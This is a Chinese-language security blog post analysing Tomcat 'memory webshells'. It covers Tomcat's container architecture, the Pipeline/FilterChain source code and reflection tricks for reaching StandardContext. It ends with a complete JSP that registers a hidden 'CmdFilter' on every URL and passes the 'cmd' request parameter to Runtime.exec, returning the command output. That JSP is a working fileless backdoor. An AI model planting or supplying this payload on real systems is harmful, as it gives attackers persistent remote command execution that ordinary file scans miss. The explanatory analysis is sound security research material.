<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Tomcat内存马 | Tyaoo's Blog</title><meta name="keywords" content="漏洞分析"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浅析Tomcat内存马">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat内存马">
<meta property="og:url" content="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Tyaoo&#39;s Blog">
<meta property="og:description" content="浅析Tomcat内存马">
<meta property="og:locale">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-12-06T07:51:42.000Z">
<meta property="article:modified_time" content="2022-02-24T18:38:37.875Z">
<meta property="article:author" content="Tyaoo">
<meta property="article:tag" content="漏洞分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tomcat内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-25 02:38:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Tomcat内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-24T18:38:37.875Z" title="Updated 2022-02-25 02:38:37">2022-02-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tomcat内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>浅析Tomcat内存马</p>
</blockquote>
<span id="more"></span>

<h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419010d17901dd228b3521a27.png" alt="image-20211202025149726" style="zoom:80%;" />

<ol>
<li>部署描述文件中由<code>&lt;listener&gt;</code>元素标记的事件监听器会被创建和初始化，事件监听器如果实现了<code>ServletContextListener</code>接口，将会调用其实现的<code>contextInitialized()</code>方法</li>
<li>部署描述文件中由<code>&lt;filter&gt;</code>元素标记的过滤器会被创建和初始化，并调用其<code>init()</code>方法，每一次请求时都只调用<code>doFilter()</code>方法进行处理</li>
<li>部署描述文件中由<code>&lt;servlet&gt;</code>元素标记的<code>Servlet</code>会根据<code>&lt;load-on-startup&gt;</code>的权值按顺序创建和初始化，并调用其<code>init()</code>方法，<code>Servlet</code>一旦被装入到Web容器之后，一般会长久驻留，直到Web容器停止运行或重新装入<code>Servlet</code>时结束生命周期，<code>Servlet</code>在第一次访问之后都只调用<code>doGet()</code>或<code>doPost()</code>方法</li>
</ol>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat体系结构"><a href="#Tomcat体系结构" class="headerlink" title="Tomcat体系结构"></a>Tomcat体系结构</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041900df05d576da5041783ccd.png" alt="image-20211201195720058" style="zoom: 50%;" />

<ul>
<li><strong>Server</strong>：表示一个Tomcat实例（单例），即整个catalina servlet容器，主要是用来管理容器下各个Serivce组件的生命周期</li>
<li><strong>Service</strong>：一组提供服务、处理请求的组件，将一组Connector组件和Engine关联了起来</li>
<li><strong>Connector</strong>：客户端连接到Tomcat容器的服务点，它为Engine提供协议服务，并根据Engine与客户端通讯的协议类型进行隔离，如HTTP、HTTPS、AJP协议</li>
<li><strong>Container</strong>：Container是容器的父接口，用于封装和管理Servlet，以及处理Request请求，它包含了四大请求处理组件：Engine、Host、Context和Wrapper</li>
<li><strong>Engine</strong>：Service中的请求处理组件，包含了Servlet容器的核心功能，主要负责将传入请求委托给适当的Host处理</li>
<li><strong>Host</strong>：虚拟主机，每个Host会与某个网络域名相匹配，负责运行多个Web Application，每个Web Application对应一个Context，负责将收到的请求匹配到对应的Context，匹配的方法为“最长匹配”</li>
<li><strong>Context</strong>：一个Contenxt代表一个Web Application，具备了Servlet运行的基本环境</li>
<li><strong>Wrapper</strong>：最底层的容器，一个Wrapper代表一个Servlet，负责Servlet的装载、初始化、执行和资源回收</li>
</ul>
<h3 id="Tomcat组件关系"><a href="#Tomcat组件关系" class="headerlink" title="Tomcat组件关系"></a>Tomcat组件关系</h3><ul>
<li>一个Server包含一个或多个Service</li>
<li>一个Service包含多个Connector和一个Container</li>
<li>一个Container只能包含一个Engine</li>
<li>一个Engine包含一个或多个Host</li>
<li>一个Host包含一个或多个Web Application</li>
<li>一个Context表示一个运行着Tomcat实例的Web Application</li>
<li>一个Web Application包含一个或多个Wrapper</li>
<li>一个Wrapper表示一个Servlet</li>
<li>Engine、Host、Context和Wrapper是显现了Container接口的容器</li>
</ul>
<h3 id="Tomcat执行流程"><a href="#Tomcat执行流程" class="headerlink" title="Tomcat执行流程"></a>Tomcat执行流程</h3><p><strong>客户端和服务端交互过程</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20211204190156f5ecc16735b1e97e53.png" alt="image-20211201195745765" style="zoom:50%;" />

<p><strong>请求数据流图</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041901cc740176246a7b512a0c.png" alt="image-20211201204202339" style="zoom: 67%;" />

<p><strong>Pipeline调用链</strong></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211202153946928.png" alt="image-20211202153946928" style="zoom:50%;" />

<ul>
<li><code>Connector</code>在某个指定的端口上来监听客户端发来的请求</li>
<li><code>Connector</code>使用<code>ProtocolHandler</code>处理器处理收到的请求，<code>ProtocolHandler</code>处理器共有三个组件<ul>
<li><code>Endpoint</code>负责接受，处理<code>socket</code>网络连接（<code>Executor</code>提供多线程操作）</li>
<li><code>Processor</code>根据协议类型封装成<code>Request</code></li>
<li><code>Adapter</code>负责将封装好的<code>Request</code>交给<code>Container</code>进行处理</li>
</ul>
</li>
<li><code>Container</code>使用<code>Pipeline-valve</code>管道处理请求，每个 <code>Pipeline</code> 都有一个最后执行的、不可删除的 <code>BasicValve</code>，通常命名为<code>Standard(xxx)Valve</code>，如上图所示，上层容器<code>valve</code>调用下层<code>valve</code>形成链式结构<ul>
<li><code>EnginePipeline</code>：<code>EngineValve1</code> -&gt; … -&gt;<code>StandardEngineValve</code></li>
<li><code>HostPipeline</code>：<code>HostValve1</code> -&gt; … -&gt;<code>StandardHostValve</code></li>
<li><code>ContextPipeline</code>：<code>ContextValve1</code> -&gt; … -&gt;<code>StandardContextValve</code></li>
<li><code>WrapperPipeline</code>：<code>WrapperValve1</code> -&gt; … -&gt;<code>StandardWrapperValve</code></li>
</ul>
</li>
<li>创建<code>FilterChain</code>，如果一个<code>URL</code>对应多个<code>Filter</code>则进行链式调用</li>
<li>最终由<code>Servlet</code>处理请求，并将处理的结果返回给<code>Connector</code></li>
<li><code>Connector</code>把响应回传给客户端</li>
</ul>
<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>StandardContext</code>是<code>Context</code>的实现类，涵盖了<code>Web Application</code>的启动流程，包括使用<code>WebResourceRoot</code>加载资源文件、利用<code>Loader</code>加载<code>class</code>，使用<code>JarScanner</code>扫描，实例化<code>Sesssion</code>管理器，初始化各种<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>等功能</p>
<p>以下讲到的内存马都是基于修改<code>StandardContext</code>实现的，所以如何获取<code>StandardContext</code>也是内存马实现的重点之一</p>
<p><strong>获取方法</strong></p>
<p>目前<code>StandardContext</code>获取的方式有以下几种：</p>
<ol>
<li><p>从<code>request</code>对象反射出<code>ApplicationContext</code>，再反射出<code>StandardContext</code></p>
<pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</code></pre>
</li>
<li><p>从<code>ThreadLocal</code>中获取<code>request</code></p>
<blockquote>
<p>Tomcat 7、8、9</p>
</blockquote>
<p>参考<strong>@threedr3am</strong>师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">文章</a></p>
</li>
<li><p>从<code>ContextClassLoader</code>中获取</p>
<blockquote>
<p>Tomcat 8、9</p>
</blockquote>
<pre><code class="java">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</code></pre>
</li>
<li><p>遍历<code>thread</code>数组获取包含<code>StandardContext</code>的类，其中<code>Acceptor</code>为全版本<code>tomcat</code>都有</p>
<blockquote>
<p>Tomcat 6、7、8、9</p>
</blockquote>
<p>参考<strong>@bitterz</strong>师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">文章</a>，比如下面方法就能够拿到<code>/manager</code>下的<code>StandardContext</code></p>
<pre><code class="java">Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);

threads[3] ==&gt; Thread[ContainerBackgroundProcessor[StandardEngine[Catalina]],5,main]

threads[3].target.this$0.children.values.toArray()[0].children.get(&quot;/manager&quot;)</code></pre>
</li>
</ol>
<h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>前面提到，当<code>StandardWrapperValve</code>执行完后就会创建<code>FilterChain</code>，所以<code>FilterChain</code>的入口位于<code>org/apache/catalina/core/StandardWrapperValve.java#invoke</code>函数中</p>
<pre><code class="java">package org.apache.catalina.core;
final class StandardWrapperValve extends ValveBase &#123;
    @Override
    public final void invoke(Request request, Response response)
        throws IOException, ServletException &#123;

        ...
        MessageBytes requestPathMB = request.getRequestPathMB();
        DispatcherType dispatcherType = DispatcherType.REQUEST;
        if (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;
        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);
        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,
                requestPathMB);
        ApplicationFilterChain filterChain =
                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); // ==&gt; 创建FilterChain

        ...</code></pre>
<pre><code class="java">package org.apache.catalina.core;
public final class ApplicationFilterFactory &#123;

    public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) &#123;

        if (servlet == null)
            return null;

        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) &#123;
            Request req = (Request) request;
            if (Globals.IS_SECURITY_ENABLED) &#123;
                filterChain = new ApplicationFilterChain();
            &#125; else &#123;
                filterChain = (ApplicationFilterChain) req.getFilterChain(); // ==&gt; 初始化一个空的FilterChain
                if (filterChain == null) &#123;
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                &#125;
            &#125;
        &#125; else &#123;
            filterChain = new ApplicationFilterChain();
        &#125;

        filterChain.setServlet(servlet); // ==&gt; 设置Servlet
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());

        StandardContext context = (StandardContext) wrapper.getParent(); // ==&gt; 获取StandardContext
        FilterMap filterMaps[] = context.findFilterMaps(); // ==&gt; 获取存储了所有filter的filterMaps，filterMaps位于StandardContext的filterMaps属性中

        if ((filterMaps == null) || (filterMaps.length == 0))
            return filterChain;

        DispatcherType dispatcher =
                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); // ==&gt; 获取调度类型为&quot;REQUEST&quot;

        String requestPath = null;
        Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
        if (attribute != null)&#123;
            requestPath = attribute.toString(); // ==&gt; 获取请求的URL路径
        &#125;

        String servletName = wrapper.getName(); // ==&gt; 获取Servlet的名字

        for (FilterMap filterMap : filterMaps) &#123;
            if (!matchDispatcher(filterMap, dispatcher)) &#123; // ==&gt; 匹配调度的指令，即&quot;REQUEST&quot;
                continue;
            &#125;
            if (!matchFiltersURL(filterMap, requestPath)) // ==&gt; 根据Filter的URLPattern匹配请求的URL
                continue;
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName()); // ==&gt; 初始化filterConfig，此处的filterDef封装了我们的Filter，filterConfigs以键值对的方式存储在StandardContext中
            if (filterConfig == null) &#123;
                continue;
            &#125;
            filterChain.addFilter(filterConfig); // ==&gt; 添加filterConfig到filterChain的filters数组中
        &#125;

        for (FilterMap filterMap : filterMaps) &#123;
            if (!matchDispatcher(filterMap, dispatcher)) &#123;
                continue;
            &#125;
            if (!matchFiltersServlet(filterMap, servletName)) // ==&gt; 匹配ServletName，但是filterMap默认的ServletName为空，所以全部跳过
                continue;
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            if (filterConfig == null) &#123;
                continue;
            &#125;
            filterChain.addFilter(filterConfig);
        &#125;

        return filterChain; // ==&gt; 返回FilterChain
    &#125;</code></pre>
<p>再次回到<code>StandardWrapperValve</code>的<code>invoke()</code>函数中</p>
<pre><code class="java">package org.apache.catalina.core;
final class StandardWrapperValve extends ValveBase &#123;
    @Override
    public final void invoke(Request request, Response response)
        throws IOException, ServletException &#123;

        ...
        MessageBytes requestPathMB = request.getRequestPathMB();
        DispatcherType dispatcherType = DispatcherType.REQUEST;
        if (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;
        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);
        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,
                requestPathMB);
        ApplicationFilterChain filterChain =
                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); // ==&gt; 创建FilterChain

        try &#123;
            if ((servlet != null) &amp;&amp; (filterChain != null)) &#123;
                if (context.getSwallowOutput()) &#123;
                    try &#123;
                        SystemLogHandler.startCapture();
                        if (request.isAsyncDispatching()) &#123;
                            request.getAsyncContextInternal().doInternalDispatch();
                        &#125; else &#123;
                            filterChain.doFilter(request.getRequest(),
                                    response.getResponse());
                        &#125;
                    &#125; finally &#123;
                        String log = SystemLogHandler.stopCapture();
                        if (log != null &amp;&amp; log.length() &gt; 0) &#123;
                            context.getLogger().info(log);
                        &#125;
                    &#125;
                &#125; else &#123;
                    if (request.isAsyncDispatching()) &#123;
                        request.getAsyncContextInternal().doInternalDispatch();
                    &#125; else &#123;
                        filterChain.doFilter
                            (request.getRequest(), response.getResponse()); // ==&gt; 调用ApplicationFilterChain的doFilter()函数
                    &#125;
                &#125;
            &#125;</code></pre>
<pre><code class="java">package org.apache.catalina.core;
public final class ApplicationFilterChain implements FilterChain &#123;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException &#123;

        if( Globals.IS_SECURITY_ENABLED ) &#123;
            final ServletRequest req = request;
            final ServletResponse res = response;
            try &#123;
                java.security.AccessController.doPrivileged(
                    new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;
                        @Override
                        public Void run()
                            throws ServletException, IOException &#123;
                            internalDoFilter(req,res);
                            return null;
                        &#125;
                    &#125;
                );
            &#125; catch( PrivilegedActionException pe) &#123;
                Exception e = pe.getException();
                if (e instanceof ServletException)
                    throw (ServletException) e;
                else if (e instanceof IOException)
                    throw (IOException) e;
                else if (e instanceof RuntimeException)
                    throw (RuntimeException) e;
                else
                    throw new ServletException(e.getMessage(), e);
            &#125;
        &#125; else &#123;
            internalDoFilter(request,response); // ==&gt; 调用internalDoFilter函数()
        &#125;
    &#125;</code></pre>
<pre><code class="java">package org.apache.catalina.core;
public final class ApplicationFilterChain implements FilterChain &#123;

    private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException &#123;

        if (pos &lt; n) &#123; // ==&gt; 遍历FilterChains
            ApplicationFilterConfig filterConfig = filters[pos++];
            try &#123;
                Filter filter = filterConfig.getFilter(); // ==&gt; 获取对应的Filter

                if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(
                        filterConfig.getFilterDef().getAsyncSupported())) &#123;
                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
                &#125;
                if( Globals.IS_SECURITY_ENABLED ) &#123;
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                        ((HttpServletRequest) req).getUserPrincipal();

                    Object[] args = new Object[]&#123;req, res, this&#125;;
                    SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);
                &#125; else &#123;
                    filter.doFilter(request, response, this); // ==&gt; 调用对应的doFilter()函数
                &#125;
            &#125; catch (IOException | ServletException | RuntimeException e) &#123;
                throw e;
            &#125; catch (Throwable e) &#123;
                e = ExceptionUtils.unwrapInvocationTargetException(e);
                ExceptionUtils.handleThrowable(e);
                throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
            &#125;
            return;
        &#125;

        try &#123;
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            &#125;

            if (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;
                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,
                        Boolean.FALSE);
            &#125;

            if ((request instanceof HttpServletRequest) &amp;&amp;
                    (response instanceof HttpServletResponse) &amp;&amp;
                    Globals.IS_SECURITY_ENABLED ) &#123;
                final ServletRequest req = request;
                final ServletResponse res = response;
                Principal principal =
                    ((HttpServletRequest) req).getUserPrincipal();
                Object[] args = new Object[]&#123;req, res&#125;;
                SecurityUtil.doAsPrivilege(&quot;service&quot;,
                                           servlet,
                                           classTypeUsedInService,
                                           args,
                                           principal);
            &#125; else &#123;
                servlet.service(request, response); // ==&gt; FilterChain结束后调用对应的Servlet
            &#125;
        &#125;
    &#125;</code></pre>
<p><strong>总结</strong></p>
<p>想要注入一个<code>filter</code>内存马，核心在篡改<code>StandardContext</code>中的<code>filterMaps</code>属性来绕过<code>dispatcher</code>和<code>requestPath</code>，然后把<code>filterConfig</code>注入到<code>StandardContext</code>的<code>filterConfigs</code>属性中即可</p>
<p><code>filterMaps</code>需要包含对应的<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012812870" style="zoom:80%;" />

<p><code>filterConfig</code>中的<code>filterDef</code>需要包含对应的<code>filter</code>、<code>filterClass</code>和<code>filterName</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012939483" style="zoom:80%;" />

<h4 id="Filter内存马实例"><a href="#Filter内存马实例" class="headerlink" title="Filter内存马实例"></a>Filter内存马实例</h4><blockquote>
<p>一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常</p>
</blockquote>
<pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;AddFilter&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;%
    Field Configs = null;
    Map filterConfigs;
    try &#123;
        // 从ServletContext中反射获取ApplicationContext和StandardContext
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        // 获取filterConfigs
        Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
        Configs.setAccessible(true);
        filterConfigs = (Map) Configs.get(standardContext);

        String FilterName = &quot;CmdFilter&quot;;
        if (filterConfigs.get(FilterName) == null) &#123;
            Filter filter = new Filter() &#123;
                @Override
                public void init(FilterConfig filterConfig) &#123;&#125;

                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter(&quot;cmd&quot;) != null) &#123;
                        InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
                        String output = s.hasNext() ? s.next() : &quot;&quot;;
                        servletResponse.getWriter().write(output);
                        PrintWriter out = servletResponse.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    &#125;
                    filterChain.doFilter(servletRequest, servletResponse);
                &#125;

                @Override
                public void destroy() &#123;&#125;
            &#125;;

            // 获取FilterDef并修改其filter、filterName和filterClass
            Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);
            Constructor declaredConstructor1 = FilterDef.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = (FilterDef) declaredConstructor1.newInstance();
            filterDef.setFilter(filter);
            filterDef.setFilterName(FilterName);
            filterDef.setFilterClass(filter.getClass().getName());
            // 加入到StandardContext的FilterDef属性中
            standardContext.addFilterDef(filterDef);

            // 获取FilterMap并修改其URLPattern、FilterName和Dispatcher
            Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);
            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterMap filterMap = (FilterMap) declaredConstructor.newInstance();
            filterMap.addURLPattern(&quot;/*&quot;);
            filterMap.setFilterName(FilterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            // 加入到StandardContext的filterMaps属性中
            standardContext.addFilterMap(filterMap);

            // 获取ApplicationFilterConfig，注入filterDef
            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);
            Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
            declaredConstructor2.setAccessible(true);
            org.apache.catalina.core.ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);
            filterConfigs.put(FilterName, filterConfig);

            response.getWriter().write(&quot;Success&quot;);
        &#125;
    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;
%&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
